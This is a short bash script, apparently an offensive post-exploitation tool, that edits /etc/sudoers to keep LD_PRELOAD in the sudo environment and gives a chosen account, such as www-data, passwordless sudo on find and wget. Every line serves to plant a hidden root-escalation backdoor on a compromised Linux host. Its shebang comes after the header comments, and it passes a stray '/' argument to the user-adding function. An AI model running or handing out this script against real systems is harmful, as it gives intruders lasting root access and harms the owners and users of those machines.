


# Author: MatheuzSec 
# Modified by: Trevohack aka "SpaceShuttleIO"



#!/bin/bash

addPreloadToPrivesc() {
	echo "Defaults    env_keep += LD_PRELOAD" >> /etc/sudoers
}

addUser() {
	read -p "Enter with user or www-data: " user 
	echo "$user ALL=(ALL:ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers
    echo "$user ALL=(ALL:ALL) NOPASSWD: /usr/bin/wget" >> /etc/sudoers

}

addPreloadToPrivesc && addUser /


echo "[+] Success! LD_PRELOAD has been added!"